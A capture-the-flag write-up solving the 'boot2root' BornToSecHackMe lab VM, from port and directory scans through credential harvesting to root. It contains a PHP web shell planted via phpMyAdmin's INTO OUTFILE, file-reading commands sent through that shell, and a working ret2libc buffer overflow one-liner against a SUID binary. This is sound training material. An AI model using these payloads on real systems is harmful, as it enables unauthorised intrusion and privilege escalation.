# IP Address Lookup

After installing and launching the VM, we are asked for a password and the machine's IP address is not indicated. </br>
Using the **Host Network Manager** from VirtualBox we can setup a local network between all virtual machines and the host.</br>
We set a narrow DHCP IP pool so we can easily find out the IP address of the VM.
<div align="center">
  <img height="400em;" src="https://user-images.githubusercontent.com/8331471/162279653-b9c308aa-b6e8-413a-839b-0477bb8041d2.png" />
  <img height="400em;" src="https://user-images.githubusercontent.com/8331471/162279805-50742c55-bbed-4f6f-ae20-52a6a34d3cb8.png" />
</div>

# Nmap - discover open ports

Once IP address is found, run a scan with  `-p-`, `-sV` and `-O` options to scan ports from 1 through 65535, enable service/version detection to determine what application is running and enable OS detection. Aggressive scan may be performed using option `-A`.
<details>
<summary>Output of nmap</summary>

```shell
┌──$ [~/42/2022/boot2root]
└─>  sudo nmap -p- -sV -O 192.168.56.101
Password: ******************
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-15 09:55 EDT
Nmap scan report for 192.168.56.101
Host is up (0.00048s latency).
Not shown: 65529 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http Apache httpd 2.2.22
993/tcp open  ssl/imap Dovecot imapd
MAC Address: 08:00:27:FD:21:F4 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.10, Linux 3.2 - 3.16
Network Distance: 1 hop
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.01 seconds
```
</details>



The scan reveals that a few serices are running and their corresponding ports.

# Dirb - path traversal
A [path traversal attack](https://owasp.org/www-community/attacks/Path_Traversal) can be performed on HTTP and HTTPS ports using **dirb**.

[**dirb**](https://www.kali.org/tools/dirb/) is a web content scanner which will looks for existing web objects. It basically works by launching a dictionary based attack.

Run **dirb** on port 80 reveal that only `index.html` and `fonts/` are accessible.
<details>
<summary>Output of dirb</summary>

```shell
┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.56.101

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Tue Mar 15 10:28:02 2022
URL_BASE: http://192.168.56.101/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.56.101/ ----
+ http://192.168.56.101/cgi-bin/ (CODE:403|SIZE:288)
==> DIRECTORY: http://192.168.56.101/fonts/
+ http://192.168.56.101/forum (CODE:403|SIZE:285)
+ http://192.168.56.101/index.html (CODE:200|SIZE:1025)
+ http://192.168.56.101/server-status (CODE:403|SIZE:293)

---- Entering directory: http://192.168.56.101/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Tue Mar 15 10:28:13 2022
DOWNLOADED: 4612 - FOUND: 4
```
</details>


Running same scan, with `-r` option, on HTTPS port 443, reveal `forum`, `phpmyadmin` and `webmail` accessible.
<details>
<summary>Output of dirb</summary>

```shell
┌──(kali㉿kali)-[~]
└─$ dirb https://192.168.56.101:443 /usr/share/dirb/wordlists/common.txt -r

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Tue Mar 15 10:35:54 2022
URL_BASE: https://192.168.56.101:443/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612

---- Scanning URL: https://192.168.56.101:443/ ----
+ https://192.168.56.101:443/cgi-bin/ (CODE:403|SIZE:289)
==> DIRECTORY: https://192.168.56.101:443/forum/
==> DIRECTORY: https://192.168.56.101:443/phpmyadmin/
+ https://192.168.56.101:443/server-status (CODE:403|SIZE:294)
==> DIRECTORY: https://192.168.56.101:443/webmail/

-----------------
END_TIME: Tue Mar 15 10:36:13 2022
DOWNLOADED: 4612 - FOUND: 2
```
</details>


# Explore the forum
The forum on https://192.168.56.101:443/forum/, is claming in the title *HackMe*.

First, there is no way to create a new user, only to log in with existing one: `admin`, `lmezard`, `qudevide`, `thor`, `wandre` and `zaz`.

A post [Probleme login ?](https://192.168.56.101/forum/index.php?id=6) contains extract of `auth.log` file. `/var/log/auth.log` keeps authentication logs for successful or failed logins, and authentication processes.

Copy this log into a file and sort by users which tried to authentificate.
```shell
┌──$ [/tmp]
└─>  cat auth.log |  grep -o "user .* from" | sort -u
user !q\]Ej?*5K5cy*AJ from
user PlcmSpIp from
user adam from
user adm from
user admin from
user ftpuser from
user guest from
user nagios from
user naos from
user nvdb from
user pi from
user support from
user test from
user ubnt from
user user from
```
Only three users were succesefuly authenticated.
```shell
┌──$ [/tmp]
└─>  cat auth.log |  grep -o "session opened for user .*"  | sort -u
session opened for user admin by (uid=0)
session opened for user lmezard by (uid=1040)
session opened for user root by (uid=0)
session opened for user root by admin(uid=0)
session opened for user root by admin(uid=1000)
```
It seems clearly that user which tried to authentificate misstyped password instead of username `!q\]Ej?*5K5cy*AJ`. As succesefuly authenticated users are determined, try to log in forum under of one of those users.

The password allowed to authentificate on the [forum](https://192.168.56.101/forum) as `lmezard` user, but not on [webmail](https://192.168.56.101/webmail) and [phpmyadmin](https://192.168.56.101/phpmyadmin/).

On [Edit Profile](https://192.168.56.101/forum/index.php?mode=user&action=edit_profile) page the email of profile is `laurie@borntosec.net`.

# Webmail
Using the initial password `!q\]Ej?*5K5cy*AJ` and the `laurie@borntosec.net` allow to connect [webmail](https://192.168.56.101/webmail).

An email from `qudevide@mail.borntosec.net` contains credentials `root/Fg-'kKXBj87E:aJ$` to access DB [phpmyadmin](https://192.168.56.101/phpmyadmin/).

# phpMyAdmin - injection of web shell

Once logedd into [phpmyadmin](https://192.168.56.101/phpmyadmin/) a [webshell](https://en.wikipedia.org/wiki/Web_shell) can be injected using `OUTFILE` statement. But it requires to find a writtable directory of Apache web server where the webshell can be put in. To do so, **dirb** can be runned on [https://192.168.56.101/forum](https://192.168.56.101/forum).
<details>
<summary>Output of dirb</summary>

```shell
┌──(kali㉿kali)-[~]
└─$ dirb https://192.168.56.101/forum

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Apr  4 10:20:26 2022
URL_BASE: https://192.168.56.101/forum/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://192.168.56.101/forum/ ----
+ https://192.168.56.101/forum/backup (CODE:403|SIZE:295)                                                                           
+ https://192.168.56.101/forum/config (CODE:403|SIZE:295)                                                                           
==> DIRECTORY: https://192.168.56.101/forum/images/                                                                                 
==> DIRECTORY: https://192.168.56.101/forum/includes/                                                                               
+ https://192.168.56.101/forum/index (CODE:200|SIZE:4935)                                                                           
+ https://192.168.56.101/forum/index.php (CODE:200|SIZE:4935)                                                                       
==> DIRECTORY: https://192.168.56.101/forum/js/                                                                                     
==> DIRECTORY: https://192.168.56.101/forum/lang/                                                                                   
==> DIRECTORY: https://192.168.56.101/forum/modules/                                                                                
==> DIRECTORY: https://192.168.56.101/forum/templates_c/                                                                            
==> DIRECTORY: https://192.168.56.101/forum/themes/                                                                                 
==> DIRECTORY: https://192.168.56.101/forum/update/                                                                                 
                                                                                                                                    
[...]
                                                                               
-----------------
END_TIME: Mon Apr  4 10:20:30 2022
DOWNLOADED: 4612 - FOUND: 4

```
</details>


`/var/www/` is the default installation directory for Apache2 and forum is located inside this directory. So, trying to execute following SQL query allow to write a file into `/var/www/forum/templates_c/`. 
`templates_c` is a ...
```sql
SELECT "<pre><?php system($_GET['cmd'])?></pre>" INTO OUTFILE '/var/www/forum/templates_c/shell.php'
```
Once the query is executed and confirmation message is prompted `Your SQL query has been executed successfully ( Query took 0.0002 sec )` the webshell can be accessed at [https://192.168.56.101/forum/templates_c/shell.php](https://192.168.56.101/forum/templates_c/shell.php). 

As the PHP super global variable `$_GET` is used to collect data sent in the URL, the parameters `cmd` is sent to shell.php and evaluated by `system()`.

So passing, for example, `id` in `cmd` parameter gives an output of executed command (https://192.168.56.101/forum/templates_c/shell.php?cmd=id)
```shell
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```
From here, find all file belongs to a user called “www-data” in / file system:
https://192.168.56.101/forum/templates_c/shell.php?cmd=find+/home+-user+www-data
```
/home
/home/LOOKATME
/home/LOOKATME/password
```
Running [cmd=cat /home/LOOKATME/password](https://192.168.56.101/forum/templates_c/pre.php?cmd=cat%20/home/LOOKATME/password) prints the content of the file which is credential to log into `lmezard`.
```
lmezard:G!@M6f4Eatau{sF"
```

# FTP - Fun
```shell
┌──(kali㉿kali)-[/tmp/b2r]
└─$ ftp lmezard@192.168.56.101
Connected to 192.168.56.101.
220 Welcome on this server
331 Please specify the password.
Password: G!@M6f4Eatau{sF"
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||44578|)
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
ftp> mget *
mget README [anpqy?]? a
Prompting off for duration of mget.
229 Entering Extended Passive Mode (|||15980|)
150 Opening BINARY mode data connection for README (96 bytes).
100% |****************************************************************************************|    96        2.28 MiB/s    00:00 ETA
226 Transfer complete.
96 bytes received in 00:00 (515.10 KiB/s)
229 Entering Extended Passive Mode (|||51397|)
150 Opening BINARY mode data connection for fun (808960 bytes).
100% |****************************************************************************************|   790 KiB   56.21 MiB/s    00:00 ETA
226 Transfer complete.
808960 bytes received in 00:00 (55.12 MiB/s)
```
Received files are an archive with a little challenge and a text file indicating that the password will allow to log as `laurie` in SSH.
```shell
┌──(kali㉿kali)-[/tmp/b2r]
└─$ file *                    
fun:    POSIX tar archive (GNU)
README: ASCII text
```
Extract files from an archive
```shell
┌──(kali㉿kali)-[/tmp/b2r]
└─$ tar -xf fun 
┌──(kali㉿kali)-[/tmp/b2r]
└─$ ls -l ft_fun
total 3028
-rw-r----- 1 kali kali    26 Aug 13  2015 00M73.pcap
[...]
-rw-r----- 1 kali kali    28 Aug 13  2015 ZQTK1.pcap
```
`.pcap` extension are false trail. Those files are simple ASCII text files containing C line instructions and C-style comments.
The challenge here is to rebuild the program in C and get the password.

For this purpose a shell sciprt `fun.sh` is created. It gets all files containing a string 'file' in it, itterates over them and rename them according to file number in the comment. Finally it concatenate those files into main.c, compile it and execute.
```shell
┌──(kali㉿kali)-[/tmp/b2r/ft_fun]
└─$ ./fun.sh                           
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
┌──(kali㉿kali)-[/tmp/b2r/ft_fun]
└─$ echo -n Iheartpwnage | shasum -a256
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```

# SSH laurie - Diffusing the bomb
Once logged into laurie, two file are located in home directory.
```shell
┌──(kali㉿kali)-[~]
└─$ ssh laurie@192.168.56.101
The authenticity of host '192.168.56.101 (192.168.56.101)' can't be established.
ECDSA key fingerprint is SHA256:d5T03f+nYmKY3NWZAinFBqIMEK1U0if222A1JeR8lYE.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.101' (ECDSA) to the list of known hosts.
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.56.101's password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
laurie@BornToSecHackMe:~$ ls
bomb  README
laurie@BornToSecHackMe:~$ file *
bomb:   ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.0.0, not stripped
README: ASCII text
laurie@BornToSecHackMe:~$ cat README 
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

The challenge is to defuse the bomb composed of 6 phases to get all the password.

## Phase 1. String compare
<details>
<summary>Details...</summary>

First phase is pretty straightforward, the program calls `strings_not_equal` to compare user input with string literal `Public speaking is very easy.`.
```gdb
laurie@BornToSecHackMe:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble phase_1" bomb
[...]
   0x08048b2c <+12>:    push   0x80497c0
   0x08048b31 <+17>:    push   eax
   0x08048b32 <+18>:	call   0x8049030 <strings_not_equal>
   0x08048b37 <+23>:	add    esp,0x10
   0x08048b3a <+26>:	test   eax,eax
   0x08048b3c <+28>:	je     0x8048b43 <phase_1+35>
   0x08048b3e <+30>:	call   0x80494fc <explode_bomb>
   0x08048b43 <+35>:	mov    esp,ebp
[...]
```
</details>

## Phase 2. Factorial
<details>
<summary>Details...</summary>

By reverse engineering the program, the second phase is about factorial. The input must be first six numbers of the factorial sequence starting from 1.
```c
int n[6];

if (n[0] != 1)
	explode_bomb();
for (int i = 1; i != 6; ++i)
	if (n[i] != (i + 1) * n[i - 1])
		explode_bomb();
```
```
1! = 1
2! = 2 * 1 = 2
3! = 3 * 2 = 6
4! = 4 * 6 = 24
5! = 5 * 24 = 120
6! = 6 * 120 = 720
```
</details>

## Phase 3. Case combination
<details>
<summary>Details...</summary>

The format contains conversion specifiers `%d %c %d` which means that the input format must be `int char int`. 
According to the hint of README file, the matching character is `b`. Then, we can find 3 combinations `1 b 214`, `2 b 755` and `7 b 524`. All of them can defuse the bomb phase 3, so we need try them with SSH thor.
```c
if (sscanf(str, "%d %c %d", &a, &b, &c) < 3)
	explode_bomb();
switch (a) {
/* ... */
case 1:
	ref = 'b';
	if (c != 214) // 0x08048c02 <+106>: cmp DWORD PTR [ebp-0x4],0xd6
		explode_bomb();
	break;
case 2:
	ref = 'b';
	if (c != 755)
		explode_bomb();
	break;
/* ... */
case 7:
	ref = 'b';
	if (c != 524)
		explode_bomb();
	break;
```
</details>

## Phase 4. Fibonacci
<details>
<summary>Details...</summary>

Fourth phase calls `func4()` to take user input number N as index then compares Nth fibonacci number with 55. Since index starts from 0, the input index need to be `9` to get 55.
```c
int func4(int n)
{
	int ret;

	if (n <= 1)
		return 1;
	return func4(n - 2) + func4(n - 1);
}
```
</details>

## Phase 5. Magic cipher
<details>
<summary>Details...</summary>

On this phase bitwise AND(&) each character of the user input string `str[i]` with `0xf`. The result is used as index of charset `isrveawhobpnutfg` to create a new string. Then the program compares new string with `giants`.
```c
char *charset = "isrveawhobpnutfg";

if (strlen(str) != 6)
	explode_bomb();
for (int i = 0; i != 6; ++i)
	str[i] = charset[str[i] & 0xf];
if (strcmp(str, "giants"))
	explode_bomb();
```

```
char     index     possible lowercase characters
 g        0xf                0x6f(o)
 i        0x0                0x70(p)
 a        0x5            0x65(e) 0x75(u)
 n        0xb                0x6b(k)
 t        0xd                0x6d(m)
 s        0x1            0x61(a) 0x71(q)
```
Since the input is used to be AND(&) with `0xf`, we just need to find possible characters whose last 4 bytes match index of charset `isrveawhobpnutfg`.
Four possible strings are `opekma`, `opekmq`, `opukma` and `opukmq`. After trying them all, `opekmq` is the answer.
</details>

## Phase 6. Sorting numbers
<details>
<summary>Details...</summary>

Phase 6 sorts an int array based on user input and check if it's sorted. From hint part of README file, the first number is 4. Since the 4th number is the biggest one, the array is sorted in descending order.
```gdb
laurie@BornToSecHackMe:~$ gdb -q bomb
Reading symbols from /home/laurie/bomb...done.
(gdb) break phase_6
Breakpoint 1 at 0x8048da1
(gdb) run
Starting program: /home/laurie/bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 2 6 24 120 720
That's number 2.  Keep going!
1 b 214
Halfway there!
9
So you got that one.  Try this one.
opekmq
Good work!  On to the next...
1 1 1 1 1 1

Breakpoint 1, 0x08048da1 in phase_6 ()
(gdb) print node1
$1 = 253
(gdb) print node2
$2 = 725
(gdb) print node3
$3 = 301
(gdb) print node4
$4 = 997
(gdb) print node5
$5 = 212
(gdb) print node6
$6 = 432
```
```
997  725  432  301  253  212
 4    2    6    3    1    5
```
</details>

Diffusing stages of bomb are the password for thor user is `Publicspeakingisveryeasy.126241207201b2149opekmq426315`. 

```shell
laurie@BornToSecHackMe:~$ cat bomb.txt
Public speaking is very easy.
1 2 6 24 120 720
1 b 214
9
opekmq
4 2 6 3 1 5

laurie@BornToSecHackMe:~$ ./bomb < bomb.txt
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Phase 1 defused. How about the next one?
That's number 2.  Keep going!
Halfway there!
So you got that one.  Try this one.
Good work!  On to the next...
Congratulations! You've defused the bomb!
```
But according to a [stackoverflow thread](https://stackoverflow.com/c/42network/questions/664), these is an error in the ISO file, the real password is `Publicspeakingisveryeasy.126241207201b2149opekmq426135`.

# SSH thor - Turle
Two text files are located in the home directory of thor user. 
```shell
┌──(kali㉿kali)-[~]
└─$ ssh thor@192.168.56.101
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
thor@192.168.56.101's password: Publicspeakingisveryeasy.126241207201b2149opekmq426135
thor@BornToSecHackMe:~$ ls
README  turtle
thor@BornToSecHackMe:~$ file *
README: ASCII text
turtle: ASCII text
thor@BornToSecHackMe:~$ cat README 
Finish this challenge and use the result as password for 'zaz' user.
```
Filename `turtle` is a hint refering to Python library called [turtle](https://docs.python.org/3/library/turtle.html).
As it run graphic window, copy the file outside the VM. 
```shell
kali@kali:~$ scp thor@192.168.56.101:~/turtle .
thor@192.168.56.101's password: Publicspeakingisveryeasy.126241207201b2149opekmq426135
turtle                                                                             100%   31KB   7.8MB/s   00:00 
```
Translating instruction lines into turtle methods result in a valid script that can be runned
```shell
┌──(kali㉿kali)-[~]
└─$ sed -i -E "s/Avance (.*) spaces/fd(\1)/g;s/Recule (.*) spaces/bk(\1)/g;s/Tourne droite de (.*) degrees/rt(\1)/g;s/Tourne gauche de (.*) degrees/lt(\1)/g;s/Can/# Can/g;1s/^/from turtle import *\n\n/" turtle; echo "done()" >> turtle
```
Once, the script is runned a turtle shape letters "SLASH".
<details>
<summary>Turtle output</summary>

<img width="849" alt="Screen Shot 2022-04-05 at 17 10 24" src="https://user-images.githubusercontent.com/22397481/161786071-90ecdd4e-d025-468f-8a3d-21d353356f5c.png">
</details>

The password is MD5 hash of SLASH.
```shell
kali@kali:~$ echo -n SLASH | md5sum
646da671ca01bb5d84dbb5fb2238dc8e  -
```

# SSH zaz - BOF/ret2libc
A SUID executable owned by root is located in zaz's home directory.
```shell
kali@kali:~$ ssh zaz@192.168.56.101
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
zaz@192.168.56.101's password: 646da671ca01bb5d84dbb5fb2238dc8e
zaz@BornToSecHackMe:~$ id
uid=1005(zaz) gid=1005(zaz) groups=1005(zaz)
zaz@BornToSecHackMe:~$ ls -l
total 5
-rwsr-s--- 1 root zaz 4880 Oct  8  2015 exploit_me
drwxr-x--- 3 zaz  zaz  107 Oct  8  2015 mail
```
Reverse of `exploit_me` binary give a C program which expect on argumet, otherwise it return 1. Copy user argumet into defined `char` buffer of 128 bytes and puts it on the strandard output.
```c
#include <string.h>

int main(int argc, char *argv[])
{
    char buf[128];

	if (argc == 1)
		return 1;
	strcpy(buf, argv[1]);
	puts(buf);

	return 0;
}
```
The security consideration section of `strcpy()` mention that this function is easily misused in a manner which enables malicious users to arbitrarily change a running program's functionality through a buffer overflow attack as the size of `argv[1]` is not checked.
The goal is to overwrite the EIP register to change the direction flow of the program to call `system()` function to run a new shell, also know as [ret2libc attack](https://en.wikipedia.org/wiki/Return-to-libc_attack).</br>
First step is to calculate an offset either by using a tool like [BOFEOSG](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) or manually.
```gdb
zaz@BornToSecHackMe:~$ gdb -q exploit_me
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
(gdb) break *0x08048420
Breakpoint 1 at 0x8048420
(gdb) run 42
Starting program: /home/zaz/exploit_me 42

Breakpoint 1, 0x08048420 in main ()
(gdb) info registers eax
eax            0xbffff6d0	-1073744176
(gdb) info frame
Stack level 0, frame at 0xbffff760:
 eip = 0x8048420 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff758, args:
 Locals at 0xbffff758, Previous frame's sp is 0xbffff760
 Saved registers:
  ebp at 0xbffff758, eip at 0xbffff75c
(gdb) print 0xbffff75c - 0xbffff6d0
$1 = 140
```
The second step is to find addresse of `system()` function and the pointer to the string "/bin/sh".
```gdb
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) find &system,+9999999,"/bin/sh"
0xb7f8cc58
```
Once all information are gathered, the exploit can be applied.
```shell
zaz@BornToSecHackMe:~$ ./exploit_me `perl -e 'print "A"x140 . pack("V", 0xb7e6b060) . pack("V", 0xb7e5ebe0) . pack("V", 0xb7f8cc58)'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`���AAAAX���
# id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
# whoami
root
# cat /root/README
CONGRATULATIONS !!!!
To be continued...
```
